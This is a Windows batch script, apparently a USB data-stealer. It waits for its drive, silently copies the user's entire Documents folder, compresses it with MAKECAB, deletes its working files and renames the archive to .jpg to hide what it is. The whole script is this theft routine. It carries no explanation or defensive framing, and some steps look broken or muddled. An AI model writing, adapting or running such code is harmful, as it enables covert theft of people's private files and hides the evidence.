@echo off

cls
echo waiting
goto check


:start

set choice=
set folder=a\%random%
robocopy "%USERPROFILE%\Documents" "%cd%\%folder%" /E












cd %cd%\a
SETLOCAL ENABLEDELAYEDEXPANSION

SET sourceDirPath=%1
IF [%2] EQU [] (
  SET destinationDirPath="%cd%"
) ELSE (
  SET destinationDirPath="%2"
)
IF [%3] EQU [] (
  SET destinationFileName="%~n1%z.zip"
) ELSE (
  SET destinationFileName="%3"
)
SET tempFilePath=%TEMP%\FilesToZip.txt
TYPE NUL > %tempFilePath%

FOR /F "DELIMS=*" %%i IN ('DIR /B /S /A-D "%sourceDirPath%"') DO (
  SET filePath=%%i
  SET dirPath=%%~dpi
  SET dirPath=!dirPath:~0,-1!
  SET dirPath=!dirPath:%sourceDirPath%=!
  SET dirPath=!dirPath:%sourceDirPath%=!
  ECHO .SET DestinationDir=!dirPath! >> %tempFilePath%
  ECHO "!filePath!" >> %tempFilePath%
)

MAKECAB /D MaxDiskSize=0 /D CompressionType=MSZIP /D Cabinet=ON /D Compress=ON /D UniqueFiles=OFF /D DiskDirectoryTemplate=%destinationDirPath% /D CabinetNameTemplate=%destinationFileName%  /F %tempFilePath% > NUL 2>&1
cd ..
mkdir z

ROBOCOPY a z z.zip



DEL setup.inf > NUL 2>&1
DEL setup.rpt > NUL 2>&1
DEL %tempFilePath% > NUL 2>&1


SETLOCAL
SET "sourcedir=%cd%\a"
SET "keepfile=*.zip"
SET "keepdir=%cd%\a"

FOR /d %%a IN ("%sourcedir%\*") DO IF /i NOT "%%~nxa"=="%keepdir%" RD /S /Q "%%a"
FOR %%a IN ("%sourcedir%\*") DO IF /i NOT "%%~nxa"=="%keepfile%" DEL "%%a"





rmdir /s /q %cd%\a


pushd z


ren *.zip* *.jpg

popd







echo Waiting for removal
exit
goto wait

:check
timeout /t 1 /nobreak >nul
if exist "%cd%" (goto start) else goto check

:wait
timeout /t 1 /nobreak >nul
if exist "%cd%" (goto wait) else (
echo removed
echo waiting
goto check
)